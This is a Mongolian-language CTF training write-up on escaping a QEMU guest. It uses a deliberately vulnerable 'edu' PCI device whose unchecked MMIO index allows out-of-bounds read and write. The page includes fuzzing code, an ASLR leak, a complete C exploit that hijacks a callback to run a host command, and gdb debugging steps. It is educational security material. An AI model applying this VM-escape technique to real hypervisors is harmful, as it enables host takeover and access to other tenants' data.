---
title: VM escape (hypervisor)
description: QEMU-ийн эмзэг PCI төхөөрөмжийг (edu) MMIO-оор fuzzing хийж олсон OOB алдаагаар guest-ээс host (hypervisor) руу гарч код ажиллуулах.
pagefind: false
---

Userland pwn нь нэг **процессыг**, kernel pwn нь үйлдлийн системийн **цөмийг** эвддэг. **Hypervisor pwn** нь
нэг шат дээшилж — **виртуал машинаас (guest) гарч** доор нь ажиллаж буй hypervisor (энд **QEMU**) процесс руу
халдана. Үүнийг **VM escape** гэдэг. Guest доторх эрх (root ч бай) hypervisor-ийн хувьд зүгээр нэг энгийн
процесс тул guest-ээс QEMU-г эвдэж чадвал **host** дээр код ажиллуулж, бусад VM болон host-ийн нууцад хүрнэ.

Халдлагын гадаргуу нь QEMU-ийн **emulated төхөөрөмжүүд**: guest тэдгээрт MMIO/PMIO/DMA-аар ханддаг ба тэдгээрийн
C handler-үүд дотор алдаа (OOB, overflow, UAF) байвал host санах ойг унших/бичих боломж гарна.

:::caution[Туршилтын хуудас]
Энэ бол өөрсдийн зориудаар эмзэг болгосон төхөөрөмж дээрх **сургалтын** challenge. Жинхэнэ hypervisor escape
илүү төвөгтэй (ROP/arbitrary call), доор [Тэмдэглэл](#тэмдэглэл)-ийг үз.
:::

## Бодлого

Бид QEMU-ийн сурах зорилготой **`edu`** PCI төхөөрөмжид зориудаар алдаа суулгасан. Guest доторх энгийн
userland программ уг алдааг ашиглан QEMU (hypervisor) процессыг хулгайлж, host дээрх `/flag`-ийг уншина.

| Файл | Тайлбар |
|------|---------|
| [`edu.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/hypervisor/vm-escape/edu.c) | Эмзэг болгосон QEMU төхөөрөмжийн эх код |
| [`build.sh`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/hypervisor/vm-escape/build.sh) | QEMU-г эх кодоос угсарна → `qemu-system-x86_64` |
| [`bzImage`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/hypervisor/vm-escape/bzImage) | Guest kernel (PCI-тэй) |
| [`rootfs.cpio.gz`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/hypervisor/vm-escape/rootfs.cpio.gz) | Guest initramfs (root shell) |
| [`run.sh`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/hypervisor/vm-escape/run.sh), [`Dockerfile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/hypervisor/vm-escape/Dockerfile) | Local / remote ажиллуулах |

Ажиллуулах (эхлээд QEMU-г угсарна — `build.sh` deps: `build-essential meson ninja-build pkg-config python3-venv libglib2.0-dev libpixman-1-dev libfdt-dev flex bison git curl xz-utils`):

```console
$ cd challenges/pwn/hypervisor/vm-escape
$ ./build.sh                 # QEMU-г edu-тэй угсарна (хэдэн минут)
$ ./run.sh                   # guest root shell (debug)
$ ./run.sh exploit           # exploit-ийг guest-д auto-run
```

Guest дотор та **root**. QEMU-г host дээр энгийн хэрэглэгч ажиллуулж байгаа — зорилго нь тэр процесс руу гарах.

## Эмзэг төхөөрөмж — `edu`

`edu` бол QEMU-д байдаг жишээ PCI төхөөрөмж (vendor `0x1234`, device `0x11e8`). BAR0 дээр **1 MB MMIO** register
орон зайтай. Бид дараах 3 register нэмж, зориудаар **хил шалгадаггүй индекс** оруулсан:

```c
struct EduState {
    ...
    char      vbuf[0x1000];            // scratch буфер
    uint64_t  vidx;                    // guest өгдөг индекс — ХИЛ ШАЛГАХГҮЙ
    void    (*on_trigger)(EduState *); // vbuf+0x1008-д байрлах callback
};

// MMIO write:
case 0x100: edu->vidx = val; break;                       // индекс тавих
case 0x108: *(uint64_t *)(edu->vbuf + edu->vidx) = val;   // OOB WRITE
    break;
case 0x110: if (edu->on_trigger) edu->on_trigger(edu);    // callback дуудах
    break;
// MMIO read:
case 0x108: val = *(uint64_t *)(edu->vbuf + edu->vidx);   // OOB READ
    break;
```

`vidx`-ийг шалгахгүй тул `vbuf`-аас **дурын зайд** QEMU процессын санах ойг унших/бичих боломж (relative
OOB read/write) гарч байна. `on_trigger` нь `vbuf`-аас яг `0x1008` (0x1000 буфер + 8 vidx) байтын зайд байна.

Guest-ээс MMIO-д хандахдаа PCI resource-ийг sysfs-ээр `mmap` хийнэ:

```c
// /sys/bus/pci/devices/<BDF>/resource0 -> BAR0 (MMIO) mmap
int fd = open(path, O_RDWR | O_SYNC);
volatile uint8_t *m = mmap(0, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
#define R64(off)     (*(volatile uint64_t *)(m + (off)))
#define W64(off,val) (*(volatile uint64_t *)(m + (off)) = (val))
```

## 1. Fuzzing — алдааг олох

Төхөөрөмжийн register-үүд рүү **санамсаргүй** утга шидэж QEMU-г унагаах нь алдааг олох хамгийн хурдан арга.
`vidx`-д том санамсаргүй утга өгөөд `0x108`-ийг уншиж/бичихэд OOB нь эрт орой нэгэн цагт QEMU-ийн map
хийгдээгүй хаяг руу хүрч **SIGSEGV** өгнө:

```c
for (long i = 0; ; i++) {
    uint64_t idx = ((uint64_t)rand() << 12) ^ rand();   // том санамсаргүй offset
    W64(0x100, idx);                                     // vidx = idx
    if (rand() & 1) { volatile uint64_t v = R64(0x108); (void)v; }  // OOB read
    else            { W64(0x108, 0x4141414141414141ULL); }          // OOB write
}
```

```ansi
[fuzz] 0 tries, last idx=0x...
[fuzz] 256 tries, last idx=0x...
qemu-system-x86_64: segmentation fault (core dumped)   [1;31m# QEMU crash — алдаа олдлоо[0m
```

QEMU процесс SIGSEGV авч унахад **бүх VM зогсоно**. Энэ нь төхөөрөмжийн handler дотор санах ойн алдаа байгааг
батлаж байна. Дараа нь уг OOB-ийг **хянамгай** ашиглаж escape болгоно.

:::note
Бодит ажилд санамсаргүй fuzzing-ийн оронд QEMU-ийн өөрийн [device fuzzer](https://www.qemu.org/docs/master/devel/testing/fuzzing.html)
(libFuzzer дээр суурилсан, MMIO/PMIO/DMA-г coverage-удирдлагатай шиднэ) эсвэл Morion/Nyx зэргийг хэрэглэдэг.
:::

## 2. Exploit primitive

OOB-оос бид дараах чадварыг гаргаж авлаа:

- **Relative read:** `vidx = off; R64(0x108)` → `*(u64*)(vbuf+off)` буцаана.
- **Relative write:** `vidx = off; W64(0x108, val)` → `*(u64*)(vbuf+off) = val`.
- **Call:** `W64(0x110, 1)` → `on_trigger(edu)` дуудна.

`on_trigger` нь `vbuf+0x1008`-д байгаа тул түүнийг унших, дарж бичих боломжтой. Эвдэх төлөвлөгөө:
`on_trigger`-ийг хулгайлж, QEMU дотор урьдчилж суулгасан `edu_win()` функц рүү чиглүүлнэ (`edu_win` нь
host дээр `system("cat /flag")` ажиллуулдаг — энэ бол **ret2win** хялбаршуулал).

## 3. ASLR-ийг давах (leak)

QEMU нь PIE + host ASLR-тай тул `edu_win`-ийн хаяг ажиллуулалт бүрт өөр. Гэхдээ бидэнд **relative read**
байгаа: `on_trigger`-ийн анхны утга (`edu_noop`) нь QEMU-ийн code хэсгийн хаяг тул түүнийг уншаад
QEMU-ийн base-ийг (улмаар `edu_win`-ийг) тооцоолно.

```c
W64(0x100, 0x1008);              // vidx -> &on_trigger
uint64_t noop = R64(0x108);      // leak: edu_noop-ийн runtime хаяг
uint64_t win  = noop + 0xbe0;    // edu_win = edu_noop + (edu_win-edu_noop)
```

`0xbe0` зай нь build-ээс хамаарна — угсарсан binary дээрээ `nm qemu-system-x86_64 | grep -E 'edu_win|edu_noop'`
хийж `edu_win − edu_noop`-ийг бодож гарга.

## 4. ret2win — hijack & trigger

OOB write-ээр `on_trigger`-ийг `edu_win` болгоод, `0x110` register-ийг бичиж trigger хийнэ. Guest доторх энэ
нэг MMIO бичилт **host дээр код ажиллуулах** хүртэл яаж хүрэхийг доор харуулав:

![VM escape урсгал: ① guest userland bar0+0x110 руу бичнэ; ② MMIO тул CPU hypervisor руу VM exit хийнэ; ③ QEMU-ийн edu_mmio_write handler дуудагдаж case 0x110 нь on_trigger(edu)-г дуудна; ④ on_trigger-ийг OOB write-ээр edu_win болгосон (анх edu_noop байсан); ⑤ edu_win host процессын дотор ажиллаж system("cat /flag")-ийг дуудна — guest-ээс гарч host дээр код ажиллав.](../../../../assets/pwn/vm-escape-flow.svg)

```c
W64(0x100, 0x1008);              // vidx -> &on_trigger
W64(0x108, win);                 // on_trigger = edu_win  (OOB write)
W64(0x110, 1);                   // trigger -> QEMU edu_win()-ийг ажиллуулна (HOST!)
```

`edu_win` нь QEMU процессын дотор ажиллаж `system("id; cat /flag")`-ийг host дээр дуудна. QEMU-г `-nographic`
горимд ажиллуулдаг тул уг командын гаралт guest console (таны холболт) дээр хэвлэгдэнэ.

:::caution[Spoiler]
Доор бүрэн бодолт байна. Эхлээд өөрөө оролдоорой!
:::

<details>
<summary>Бүрэн exploit</summary>

```c
// musl-gcc -static -O2 -DWIN_OFFSET=0xbe0 -o exploit exploit.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/mman.h>

#define EDU_VENDOR 0x1234
#define EDU_DEVICE 0x11e8
#define IDX_CB     0x1008     // vbuf -> on_trigger

static volatile uint8_t *edu_map(void) {
    DIR *d = opendir("/sys/bus/pci/devices");
    struct dirent *e; char path[512], buf[32]; int fd; unsigned v, dev;
    while (d && (e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/vendor", e->d_name);
        fd = open(path, O_RDONLY); if (fd < 0) continue;
        memset(buf,0,sizeof buf); read(fd, buf, 31); close(fd); v = strtoul(buf,0,16);
        snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/device", e->d_name);
        fd = open(path, O_RDONLY); if (fd < 0) continue;
        memset(buf,0,sizeof buf); read(fd, buf, 31); close(fd); dev = strtoul(buf,0,16);
        if (v == EDU_VENDOR && dev == EDU_DEVICE) {
            snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/resource0", e->d_name);
            fd = open(path, O_RDWR | O_SYNC); if (fd < 0) { perror("resource0"); exit(1); }
            void *m = mmap(0, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
            if (m == MAP_FAILED) { perror("mmap"); exit(1); }
            printf("[*] edu @ %s  BAR0 @ %p\n", e->d_name, m);
            closedir(d); return (volatile uint8_t *)m;
        }
    }
    fprintf(stderr, "edu олдсонгүй\n"); exit(1);
}

#define R64(m,off)     (*(volatile uint64_t *)((m) + (off)))
#define W64(m,off,val) (*(volatile uint64_t *)((m) + (off)) = (val))

int main(void) {
    volatile uint8_t *m = edu_map();

    W64(m, 0x100, IDX_CB);                 // 1) leak on_trigger (edu_noop)
    uint64_t noop = R64(m, 0x108);
    uint64_t win  = noop + WIN_OFFSET;      //    edu_win = edu_noop + offset
    printf("[*] leak edu_noop = %#lx\n[*] edu_win = %#lx\n", noop, win);

    W64(m, 0x100, IDX_CB);                 // 2) on_trigger = edu_win
    W64(m, 0x108, win);

    printf("[*] triggering...\n"); fflush(stdout);
    W64(m, 0x110, 1);                      // 3) hypervisor edu_win()-г host дээр ажиллуулна
    return 0;
}
```

</details>

```ansi
[*] edu @ 0000:00:04.0  BAR0 @ 0x7f...
[*] leak edu_noop = 0x5b1499f80460
[*] edu_win = 0x5b1499f81040
[*] triggering...
[1;32m[vm-escape] guest hijacked the hypervisor! running host command:[0m
uid=1001(ctf) gid=1001(ctf) ...
flag{vm3sc4pe_thr0ugh_a_f4ke_pci_d3vice}
```

Guest доторх userland программ QEMU процессыг хулгайлж, **host** дээрх `/flag`-ийг уншлаа — VM escape.

## Debug хийх

VM escape-д **хоёр тусдаа орчин** байна: *guest* (таны exploit ажиллаж буй VM) ба *host* (QEMU процесс). Тус бүрийг
өөрөөр debug хийнэ.

### Guest тал — төхөөрөмжийг олох

Эхлээд guest дотроос `edu` төхөөрөмж болон BAR0-г олно. BusyBox-д `lspci` байхгүй ч sysfs байна:

```console
/ # for d in /sys/bus/pci/devices/*/; do printf '%s %s:%s\n' "$d" \
      "$(cat $d/vendor)" "$(cat $d/device)"; done
/sys/bus/pci/devices/0000:00:04.0/ 0x1234:0x11e8      # <- edu (vendor:device)
/ # ls -l /sys/bus/pci/devices/0000:00:04.0/resource0 # <- BAR0 (MMIO), mmap хийнэ
```

`vendor=0x1234, device=0x11e8` нь `edu`. Exploit доторх `edu_map()` яг үүгээр хайж `resource0`-г `mmap` хийдэг.
Register-үүдийг гараар турших бол жижиг C бичиж `m[0x100] = ...` гэх мэтээр хандана.

### Host тал — QEMU-г gdb-ээр

Энэ бол гол шинэ ур чадвар: **hypervisor процессыг** debug хийх. QEMU-г gdb дор шууд ажиллуулбал (gdb нь
ASLR-ийг унтраадаг тул PIE base тогтмол `0x555555554000` болно) эвтэйхэн:

```console
$ gdb --args ./qemu-system-x86_64 -L pc-bios -kernel bzImage -initrd rootfs.cpio.gz \
      -append "console=ttyS0 quiet" -device edu -nographic -no-reboot -m 256M
```

Эмзэг build нь **debug_info-той** (stripped биш) тул struct болон symbol-ууд шууд харагдана. Юуны өмнө
`EduState`-ийн бүтэц, offset-уудыг гаргана:

```ansi
[1;31m(gdb)[0m ptype struct EduState
type = struct EduState {
    ...
    char dma_buf[4096];
    uint64_t dma_mask;
    char vbuf[4096];                  [90m# OOB-ийн суурь[0m
    uint64_t vidx;
    void (*on_trigger)(EduState *);
}
[1;31m(gdb)[0m p/x &((struct EduState*)0)->vbuf
$1 = 0x1cb0
[1;31m(gdb)[0m p/x &((struct EduState*)0)->on_trigger
$2 = 0x2cb8                            [90m# on_trigger - vbuf = 0x2cb8-0x1cb0 = 0x1008 -> IDX_CB[0m
[1;31m(gdb)[0m p/x (char*)edu_win - (char*)edu_noop
$3 = 0xbe0                             [90m# <- WIN_OFFSET (exploit-д дамжуулна)[0m
```

**Хаягууд (бодит утга).** gdb дотор ажиллуулахад base тогтмол `0x555555554000`. Exploit нь `on_trigger`-ийн
анхны утга (`edu_noop`)-г OOB-оор уншиж leak хийгээд `edu_win = leak + 0xbe0`-г тооцоолно:

```ansi
[1;31m(gdb)[0m p/x &edu_noop        [90m# on_trigger-ийн анхны утга — exploit үүнийг leak хийнэ[0m
$1 = [34m0x55555598a460[0m
[1;31m(gdb)[0m p/x &edu_win         [90m# зорилтот = edu_noop + 0xbe0[0m
$2 = [34m0x55555598b040[0m
```

Exploit-ийн гаралт мөн яг эдгээрийг харуулна:

```text
[*] leak edu_noop = 0x000055555598a460
[*] edu_win       = 0x000055555598b040
```

Дараа нь `edu_win` дээр breakpoint тавиад exploit-ийг ажиллуулж **guest→host урсгалыг** барина. `on_trigger`
нь `edu_noop`-оос `edu_win` руу өөрчлөгдсөн нь энд харагдана (бодит backtrace):

```ansi
[1;31m(gdb)[0m break edu_win
[1;31m(gdb)[0m run
Thread 3 hit Breakpoint 1, edu_win (s=0x555557fb7ec0) at ../hw/misc/edu.c:87
[1;31m(gdb)[0m p edu->on_trigger    [90m# hijack хийгдсэн — одоо edu_win (анх edu_noop байсан)[0m
$3 = (void (*)(EduState *)) [34m0x55555598b040[0m <edu_win>
[1;31m(gdb)[0m bt
#0  [34medu_win[0m (s=0x555557fb7ec0) at ../hw/misc/edu.c:87
#1  memory_region_write_accessor (size=8 ...) at ../system/memory.c:497
#2  access_with_adjusted_size ([34maddr=272[0m ...)       [90m# 272 = 0x110 = trigger register[0m
#3  memory_region_dispatch_write (addr=272, [34mdata=1[0m, op=MO_64 ...)
#4  int_st_mmio_leN (... val_le=1 ...)
#5  do_st_mmio_leN (...)
#8  code_gen_buffer ()                               [90m# guest-ийн MMIO бичилт (JIT)[0m
#9  cpu_tb_exec (...)
```

`bt` тодорхой харуулж байна: guest дотор `m[0x110] = 1` гэж бичсэн нь QEMU-ийн MMIO dispatch (`addr=272`)-аар
дамжин **host дээрх `edu_win`** рүү хүрсэн — энэ бол VM escape-ийн мөч. OOB бичилтийг өөрийг нь ажиглах бол:

```ansi
[1;31m(gdb)[0m break edu.c:330                [90m# *(u64*)(vbuf+vidx) = val;[0m
[1;31m(gdb)[0m p/x edu->vidx                   [90m# 0x1008 -> on_trigger-ийг онилж байна[0m
[1;31m(gdb)[0m p edu->on_trigger               [90m# trigger-ийн өмнө/дараа харьцуулна[0m
```

:::tip
QEMU аль хэдийн ажиллаж байгаа бол `gdb -p $(pgrep -f qemu-system-x86_64)`-ээр хавсаргана. ASLR асаалттай
тул (exploit шиг) `edu_noop`-г leak хийж base-ээ тооцоол, эсвэл `info proc mappings`-ээс base-ийг хар.
:::

## Ажиллуулах

**Local.** Эхлээд QEMU-г угсарна, дараа нь exploit-ийг guest-д auto-run хийнэ:

```console
$ ./build.sh
$ musl-gcc -static -O2 -DWIN_OFFSET=0xbe0 -o exploit exploit.c
$ ./run.sh exploit
```

**Сервер (remote).** Docker image холбогдоход guest root shell өгнө. Exploit-ээ (static binary) shell руу
base64-ээр дамжуулж ажиллуулна — аргачлал [kernel challenge](../../kernel/ret2usr/#compiled-exploit-ийг-remote-руу-дамжуулах)-тай ижил:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-vm-escape
$ nc localhost 1337
/ # base64 -d > /tmp/e << 'EOF'
<musl static exploit-ийн base64 (мөрөөр тасарсан)>
EOF
/ # chmod +x /tmp/e && /tmp/e
```

## Тэмдэглэл

- **ret2win хялбаршуулал.** Бодит challenge-д `edu_win` гэж бэлэн функц байдаггүй. Тэнд OOB read/write-ээр
  QEMU-ийн heap/code-ийг судалж, function pointer (жишээ `MemoryRegionOps`, timer callback) эсвэл ROP-оор
  RIP барьж, host дээр `execve` хүртэл хүрдэг. Энэ хуудас escape-ийн **механизмыг** (guest→host урсгал)
  харуулах зорилготой тул ret2win-ээр хялбаршуулсан.
- **Leak + overwrite** нь host ASLR-ийг давна — exploit нь ямар ч тогтмол хаяг ашиглахгүй.
- QEMU-г KVM-гүйгээр (**TCG**, software) ажиллуулж болох тул серверт тусгай эрх шаардахгүй.
- Host дээр гарсны дараа жинхэнэ орчинд guest escape нь бусад tenant, host kernel руу цааш (**L1→L0**,
  дараа нь kernel privesc) үргэлжилж болно.
